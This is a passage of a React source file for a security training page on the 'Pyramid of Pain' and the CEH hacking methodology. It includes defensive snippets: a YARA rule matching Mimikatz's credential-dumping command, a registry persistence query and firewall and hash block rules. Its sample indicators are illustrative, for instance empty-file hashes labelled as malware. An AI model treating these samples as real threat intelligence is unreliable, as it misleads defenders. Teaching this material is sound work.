                            <div className="absolute inset-0 pointer-events-none z-10 opacity-50" style={{ background: 'repeating-linear-gradient(transparent 0px, transparent 1px, rgba(0,0,0,0.18) 1px, rgba(0,0,0,0.18) 2px)', backgroundSize: '100% 2px' }} />
                            index=windows EventCode=4624 Logon_Type=3 <br/>
                            | regex src_ip!="^10\\." <br/>
                            | stats count by user, src_ip <br/>
                            | where count &gt; 50
                          </div>
                        </div>
                      </div>
                    </>
                  )}
                  {activePyramidLayer === 4 && (
                    <>
                      <div className="flex justify-between items-start mb-4">
                        <h3 className="text-xl font-bold text-orange-500">Tools</h3>
                        <span className="bg-orange-500/20 text-orange-500 text-xs px-2 py-1 rounded font-bold uppercase tracking-wider">Challenging</span>
                      </div>
                      <p className="text-sm text-slate-300 mb-6 leading-relaxed">Software used by the adversary to accomplish their mission. Detecting tool artifacts forces the attacker to find, build, or buy new tools, costing them time and development effort.</p>
                      
                      <div className="space-y-4 flex-1">
                        <div>
                          <span className="text-xs font-bold text-slate-500 uppercase tracking-wider mb-2 block">Examples</span>
                          <div className="bg-slate-950 border border-slate-800 rounded p-3 text-xs text-slate-400 font-mono">
                            - Mimikatz (Credential Dumping)<br/>
                            - Cobalt Strike (C2 Framework)<br/>
                            - BloodHound (AD Recon)
                          </div>
                        </div>
                        <div>
                          <span className="text-xs font-bold text-slate-500 uppercase tracking-wider mb-2 block">YARA Rule Detection</span>
                          <div className="bg-slate-950 border border-orange-500/30 rounded p-3 text-[10px] sm:text-xs text-orange-400 font-mono relative">
                            <div className="absolute inset-0 pointer-events-none z-10 opacity-50" style={{ background: 'repeating-linear-gradient(transparent 0px, transparent 1px, rgba(0,0,0,0.18) 1px, rgba(0,0,0,0.18) 2px)', backgroundSize: '100% 2px' }} />
                            rule Mimikatz_String_Catch &#123;<br/>
                            &nbsp;&nbsp;strings:<br/>
                            &nbsp;&nbsp;&nbsp;&nbsp;$s1 = "sekurlsa::logonpasswords" ascii<br/>
                            &nbsp;&nbsp;condition:<br/>
                            &nbsp;&nbsp;&nbsp;&nbsp;$s1<br/>
                            &#125;
                          </div>
                        </div>
                      </div>
                    </>
                  )}
                  {activePyramidLayer === 3 && (
                    <>
                      <div className="flex justify-between items-start mb-4">
                        <h3 className="text-xl font-bold text-amber-500">Network/Host Artifacts</h3>
                        <span className="bg-amber-500/20 text-amber-500 text-xs px-2 py-1 rounded font-bold uppercase tracking-wider">Annoying</span>
                      </div>
                      <p className="text-sm text-slate-300 mb-6 leading-relaxed">Unique traces left behind by attacks. Blocking these forces attackers to modify their tools to change the artifacts left behind, causing annoying delays.</p>
                      
                      <div className="space-y-4 flex-1">
                        <div>
                          <span className="text-xs font-bold text-slate-500 uppercase tracking-wider mb-2 block">Examples</span>
                          <div className="bg-slate-950 border border-slate-800 rounded p-3 text-xs text-slate-400 font-mono">
                            - Specific User-Agent strings (e.g. "sqlmap/1.4")<br/>
                            - Registry keys created for persistence<br/>
                            - Pre-configured Mutexes
                          </div>
                        </div>
                        <div>
                          <span className="text-xs font-bold text-slate-500 uppercase tracking-wider mb-2 block">Host Query (Osquery)</span>
                          <div className="bg-slate-950 border border-amber-500/30 rounded p-3 text-xs text-amber-500 font-mono relative">
                            <div className="absolute inset-0 pointer-events-none z-10 opacity-50" style={{ background: 'repeating-linear-gradient(transparent 0px, transparent 1px, rgba(0,0,0,0.18) 1px, rgba(0,0,0,0.18) 2px)', backgroundSize: '100% 2px' }} />
                            SELECT name, path <br/>
                            FROM registry <br/>
                            WHERE key LIKE 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' <br/>
                            AND data LIKE '%malware.exe%';
                          </div>
                        </div>
                      </div>
                    </>
                  )}
                  {activePyramidLayer === 2 && (
                    <>
                      <div className="flex justify-between items-start mb-4">
                        <h3 className="text-xl font-bold text-yellow-500">Domain Names</h3>
                        <span className="bg-yellow-500/20 text-yellow-500 text-xs px-2 py-1 rounded font-bold uppercase tracking-wider">Simple</span>
                      </div>
                      <p className="text-sm text-slate-300 mb-6 leading-relaxed">Domains used for phishing or C2 servers. Blocking these requires the attacker to register new domains, update DNS records, and configure new TLS certificates.</p>
                      
                      <div className="space-y-4 flex-1">
                        <div>
                          <span className="text-xs font-bold text-slate-500 uppercase tracking-wider mb-2 block">Examples</span>
                          <div className="bg-slate-950 border border-slate-800 rounded p-3 text-xs text-slate-400 font-mono">
                            - secure-login-paypa1.com (Phishing)<br/>
                            - update.microsoft-service-cdn.net (C2)<br/>
                            - DGA (Domain Generation Algorithms)
                          </div>
                        </div>
                        <div>
                          <span className="text-xs font-bold text-slate-500 uppercase tracking-wider mb-2 block">DNS Sinkholing</span>
                          <div className="bg-slate-950 border border-yellow-500/30 rounded p-3 text-xs text-yellow-400 font-mono relative">
                            <div className="absolute inset-0 pointer-events-none z-10 opacity-50" style={{ background: 'repeating-linear-gradient(transparent 0px, transparent 1px, rgba(0,0,0,0.18) 1px, rgba(0,0,0,0.18) 2px)', backgroundSize: '100% 2px' }} />
                            $ dig +short secure-login-paypa1.com<br/>
                            0.0.0.0 [BLOCKED BY PI-HOLE/DNS FIREWALL]
                          </div>
                        </div>
                      </div>
                    </>
                  )}
                  {activePyramidLayer === 1 && (
                    <>
                      <div className="flex justify-between items-start mb-4">
                        <h3 className="text-xl font-bold text-blue-500">IP Addresses</h3>
                        <span className="bg-blue-500/20 text-blue-500 text-xs px-2 py-1 rounded font-bold uppercase tracking-wider">Easy</span>
                      </div>
                      <p className="text-sm text-slate-300 mb-6 leading-relaxed">IP addresses are incredibly common IoCs. Blocking them is easy for defenders, and swapping them out is equally easy for attackers utilizing proxies or botnets.</p>
                      
                      <div className="space-y-4 flex-1">
                        <div>
                          <span className="text-xs font-bold text-slate-500 uppercase tracking-wider mb-2 block">Examples</span>
                          <div className="bg-slate-950 border border-slate-800 rounded p-3 text-xs text-slate-400 font-mono">
                            - 185.199.108.153 (Command & Control server)<br/>
                            - 45.33.32.156 (Scanning node)<br/>
                            - Fast-Flux Botnet IPs
                          </div>
                        </div>
                        <div>
                          <span className="text-xs font-bold text-slate-500 uppercase tracking-wider mb-2 block">Firewall Block Rule</span>
                          <div className="bg-slate-950 border border-blue-500/30 rounded p-3 text-xs text-blue-400 font-mono relative">
                            <div className="absolute inset-0 pointer-events-none z-10 opacity-50" style={{ background: 'repeating-linear-gradient(transparent 0px, transparent 1px, rgba(0,0,0,0.18) 1px, rgba(0,0,0,0.18) 2px)', backgroundSize: '100% 2px' }} />
                            # iptables -A INPUT -s 185.199.108.153 -j DROP<br/>
                            # iptables -A OUTPUT -d 185.199.108.153 -j DROP
                          </div>
                        </div>
                      </div>
                    </>
                  )}
                  {activePyramidLayer === 0 && (
                    <>
                      <div className="flex justify-between items-start mb-4">
                        <h3 className="text-xl font-bold text-green-500">Hash Values</h3>
                        <span className="bg-green-500/20 text-green-500 text-xs px-2 py-1 rounded font-bold uppercase tracking-wider">Trivial</span>
                      </div>
                      <p className="text-sm text-slate-300 mb-6 leading-relaxed">Cryptographic representations of specific files. If the attacker simply flips a single bit or recompiles their malware, the hash changes entirely.</p>
                      
                      <div className="space-y-4 flex-1">
                        <div>
                          <span className="text-xs font-bold text-slate-500 uppercase tracking-wider mb-2 block">Examples</span>
                          <div className="bg-slate-950 border border-slate-800 rounded p-3 text-[10px] text-slate-400 font-mono break-all">
                            - MD5: d41d8cd98f00b204e9800998ecf8427e<br/>
                            - SHA256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
                          </div>
                        </div>
                        <div>
                          <span className="text-xs font-bold text-slate-500 uppercase tracking-wider mb-2 block">EDR Block List</span>
                          <div className="bg-slate-950 border border-green-500/30 rounded p-3 text-xs text-green-400 font-mono relative">
                            <div className="absolute inset-0 pointer-events-none z-10 opacity-50" style={{ background: 'repeating-linear-gradient(transparent 0px, transparent 1px, rgba(0,0,0,0.18) 1px, rgba(0,0,0,0.18) 2px)', backgroundSize: '100% 2px' }} />
                            CrowdStrike Falcon Sensor / Defender:<br/>
                            &gt; ADD TO QUARANTINE: e3b0c442... 
                          </div>
                        </div>
                      </div>
                    </>
                  )}
                </motion.div>
              </AnimatePresence>
            </div>
          </div>
          <MarkCompleteBtn index={7} />
              </motion.div>
            )}

        {/* SECTION 9 */}
        {activeSection === 8 && (
              <motion.div
                key={8}
                initial={{ opacity: 0, y: 15 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: -15 }}
                transition={{ duration: 0.3 }}
                className="mb-10"
              >
          <motion.h2 initial={{ opacity: 0, y: 20 }} whileInView={{ opacity: 1, y: 0 }} viewport={{ once: true }} className="text-2xl font-bold text-slate-100 mb-2">Attacker's Hacking Methodology</motion.h2>
          <p className="text-sm text-slate-500 mb-6">CEH five-phase ethical hacking methodology</p>

          <div className="flex flex-col md:flex-row gap-6 items-start">
            <div className="w-full xl:w-[350px] shrink-0 overflow-x-auto [&::-webkit-scrollbar]:hidden [-ms-overflow-style:none] [scrollbar-width:none]">
              <svg viewBox="0 0 350 420" className="w-[350px] h-[420px]">
                 {[0, 1, 2, 3, 4].map(idx => {
                   const y = 10 + idx * 90;
                   const active = activeMethodPhase === idx;
                   return (
                     <g key={idx}>
                       {idx > 0 && (
                         <motion.path 
                           d={`M 175 ${y - 38} L 175 ${y}`} stroke="#22d3ee" strokeWidth="1.5" fill="none"
                           initial={{ pathLength: 0 }} whileInView={{ pathLength: 1 }} transition={{ duration: 0.5, delay: idx * 0.3 }} viewport={{ once: true }}
                         />
                       )}
                       <g 
                         onClick={() => setActiveMethodPhase(active ? null : idx)}
                         className="cursor-pointer transition-all duration-300"
                         style={{ filter: active ? "drop-shadow(0 0 8px rgba(34,211,238,0.5))" : "none" }}
                       >
                         <rect x="75" y={y} width="200" height="52" rx="8" fill="#18181b" stroke={active ? "#22d3ee" : "#52525b"} strokeWidth="1.5" />
                         <rect x="75" y={y} width="4" height="52" fill="#22d3ee" />
                         <text x="175" y={y+30} fontSize="12" fontWeight="600" fill="#e4e4e7" textAnchor="middle">{methodPhases[idx].label}</text>
                         <rect x="75" y={y} width="200" height="52" fill="transparent" /> 
                       </g>
                     </g>
                   )
                 })}
              </svg>
            </div>
            
            <div className="w-full min-h-[200px] md:min-h-[420px] flex items-start">
               <AnimatePresence mode="wait">
                 {activeMethodPhase === null ? (
                   <motion.div key="none" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} className="w-full h-full flex items-center justify-center p-12">
                     <span className="text-slate-600 text-sm italic">Click a phase to explore details</span>
                   </motion.div>
                 ) : (
                   <motion.div 
                     key={activeMethodPhase} 
                     initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -20 }} transition={{ type: "spring" }}
                     className="w-full bg-slate-900 border border-slate-800 rounded-xl p-5"
                   >
                     <h3 className="text-lg font-bold text-cyan-400 mb-2">{methodPhases[activeMethodPhase].label.substring(5)}</h3>
                     <p className="text-sm text-slate-300 leading-relaxed mb-4">{methodPhases[activeMethodPhase].desc}</p>
                     
                     <div className="mb-3">
                       <span className="text-xs text-slate-500 font-bold mr-2 uppercase block mb-1">Tools</span>
                       <div className="flex flex-wrap gap-1.5">
                         {methodPhases[activeMethodPhase].tools.map((t, i) => <span key={i} className="bg-slate-800 text-slate-300 text-[10px] md:text-xs rounded px-2 py-0.5">{t}</span>)}
                       </div>
                     </div>
                     <div className="mb-4">
                       <span className="text-xs text-slate-500 font-bold mr-2 uppercase block mb-1">Techniques</span>
                       <div className="flex flex-wrap gap-1.5">
                         {methodPhases[activeMethodPhase].techs.map((t, i) => <span key={i} className="bg-cyan-400/10 text-cyan-400 text-[10px] md:text-xs rounded px-2 py-0.5">{t}</span>)}
                       </div>
                     </div>

                     <div className="bg-slate-950 rounded-lg p-3 font-mono text-[10px] md:text-xs text-cyan-400 relative overflow-hidden">
                        <div className="absolute inset-0 pointer-events-none z-10 opacity-50" style={{ background: 'repeating-linear-gradient(transparent 0px, transparent 1px, rgba(0,0,0,0.18) 1px, rgba(0,0,0,0.18) 2px)', backgroundSize: '2px 2px' }} />
                        <div className="relative z-0 whitespace-pre-wrap">{methodPhases[activeMethodPhase].cmd}</div>
                     </div>
                   </motion.div>
                 )}
               </AnimatePresence>
            </div>
          </div>
          <MarkCompleteBtn index={8} />
              </motion.div>
            )}
          </AnimatePresence>
        </div>
      </div>
    </div>
  );
}
